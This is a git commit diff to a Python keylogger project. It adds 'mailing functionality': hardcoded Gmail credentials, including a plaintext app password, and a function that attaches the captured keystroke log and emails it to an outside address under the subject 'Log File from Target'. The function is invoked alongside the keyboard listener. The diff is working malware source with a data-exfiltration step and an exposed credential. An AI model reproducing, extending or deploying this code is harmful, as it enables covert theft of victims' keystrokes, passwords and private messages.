2df938aee3ae45c870a4ecc585c4e4d01913eeca
Ashutosh Sharma <iamashu2002@gmail.com>
2023-10-21 19:14:25 +0530

    Added mailing functionality

--- Project/keyLogger.py
+++ Project/keyLogger.py
@@ -36,9 +36,40 @@ from PIL import ImageGrab
 logFileName = "key_log.txt"
 filePath = "A:\\Code and Dev\\Python\\KeyLogger"
 extend = "\\"
+emailAddress = "testlogger.2024.5@gmail.com"
+password = "ikqh dtjr htfo ufuw"
+toAddr = "testlogger.2024.5@gmail.com"
 
 count = 0
 keys = []
+
+
+def sendEmail(fileName, attachment, toAddr):
+    fromAddr = emailAddress
+    msg = MIMEMultipart()
+    msg["From"] = fromAddr
+    msg["To"] = toAddr
+    msg["Subject"] = "Log File from Target"
+    body = "Body of the Mail"
+    msg.attach(MIMEText(body, "plain"))
+
+    fileName = fileName
+    attachment = open(attachment, "rb")
+    p = MIMEBase("application", "octet-stream")
+
+    p.set_payload(attachment.read())
+    encoders.encode_base64(p)
+
+    p.add_header("Content-Disposition", "attachment: filename="+fileName)
+    msg.attach(p)
+
+    s = smtplib.SMTP("smtp.gmail.com", 587)
+    s.starttls()
+    s.login(fromAddr, password)
+
+    text = msg.as_string()
+    s.sendmail(fromAddr, toAddr, text)
+    s.quit()
 
 
 def onPress(key):
@@ -69,10 +100,6 @@ def onRelease(key):
         return False
 
 
+sendEmail(logFileName, filePath + extend + logFileName, toAddr)
 with Listener(on_press=onPress, on_release=onRelease) as listner:
     listner.join()
-
-
-
-
-
